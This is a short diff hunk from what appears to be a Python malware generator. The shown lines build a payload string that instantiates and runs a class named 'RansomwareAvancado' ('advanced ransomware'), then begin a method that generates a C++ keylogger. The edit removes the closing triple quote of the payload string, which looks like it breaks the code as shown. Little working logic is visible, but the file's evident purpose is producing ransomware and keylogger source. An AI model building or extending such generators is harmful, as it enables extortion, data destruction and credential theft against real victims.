@@ -909,7 +909,7 @@ class RansomwareAvancado:
 
 if __name__ == '__main__':
     ransomware = RansomwareAvancado()
-    ransomware.executar()"""
+    ransomware.executar()
         return payload
     
     def gerar_cpp_keylogger(self, **kwargs) -> str:
